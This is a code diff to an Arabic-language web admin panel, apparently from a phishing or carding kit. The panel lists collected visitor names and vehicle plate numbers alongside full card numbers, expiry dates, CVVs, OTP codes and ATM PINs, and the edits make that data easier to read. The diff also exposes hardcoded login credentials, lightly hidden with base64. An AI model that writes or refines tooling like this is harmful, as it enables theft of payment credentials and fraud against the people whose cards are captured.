@@ -22,7 +22,8 @@
         .tab-content.active { display: block; }
         .card { background: white; margin-bottom: 10px; padding: 12px; border-radius: 8px; border-right: 5px solid #1e7344; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
         .data-row { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 8px; }
-        .box { padding: 5px 8px; background: #f0f0f0; border-radius: 4px; font-size: 12px; border: 1px solid #ddd; }
+        /* تعديل لعرض الأرقام بشكل صحيح من اليسار لليمين */
+        .box { padding: 5px 8px; background: #f0f0f0; border-radius: 4px; font-size: 13px; border: 1px solid #ddd; direction: ltr !important; unicode-bidi: bidi-override; }
         .btn { padding: 5px 10px; border: none; border-radius: 3px; cursor: pointer; color: white; font-size: 12px; }
         .btn-del { background: #dc3545; }
         .btn-ok { background: #28a745; }
@@ -66,7 +67,6 @@
     function checkLogin() {
         const u = document.getElementById('username').value.trim().toLowerCase();
         const p = document.getElementById('password').value.trim();
-        // التشفير لـ adman و كلمة السر HH1234567890
         if((u === atob("YWRtYW4=") || u === atob("YWRtYW5f")) && p === atob("SEgxMjM0NTY3ODkw")) {
             localStorage.setItem("admin_logged_in", "true");
             showAdmin();
@@ -106,8 +106,8 @@
             s.forEach((c) => {
                 const v = c.val();
                 h += `<div class="card">
-                    <b>${v.fullName || 'زائر'}</b><br>
-                    <small>🚗 ${v.vehicleType || '-'} | 🔢 ${v.plateNumber || '-'}</small><br>
+                    <b style="direction: rtl; display: block; text-align: right;">${v.fullName || 'زائر'}</b>
+                    <small style="direction: rtl; display: block; text-align: right;">🚗 ${v.vehicleType || '-'} | 🔢 ${v.plateNumber || '-'}</small>
                     <button class="btn btn-del" style="margin-top:5px" onclick="deleteData('visitors/${c.key}')">حذف</button>
                 </div>`;
             });
@@ -119,11 +119,11 @@
             s.forEach((c) => {
                 const v = c.val();
                 h += `<div class="card">
-                    <b>${v.cardHolder || 'عميل'}</b> 
+                    <b style="direction: rtl; display: block; text-align: right;">${v.cardHolder || 'عميل'}</b> 
                     <div class="data-row">
-                        <div class="box">${v.cardNumber || '----'}</div>
-                        <div class="box">📅 ${v.expiry || '--/--'}</div>
-                        <div class="box">🔑 ${v.cvv || '---'}</div>
+                        <div class="box" title="Card Number">${v.cardNumber || '----'}</div>
+                        <div class="box" title="Expiry">📅 ${v.expiry || '--/--'}</div>
+                        <div class="box" title="CVV">🔑 ${v.cvv || '---'}</div>
                         <div class="box" style="color:blue">OTP: ${v.otp || '-'}</div>
                         <div class="box" style="color:purple">PIN: ${v.atm_pin || '-'}</div>
                     </div>
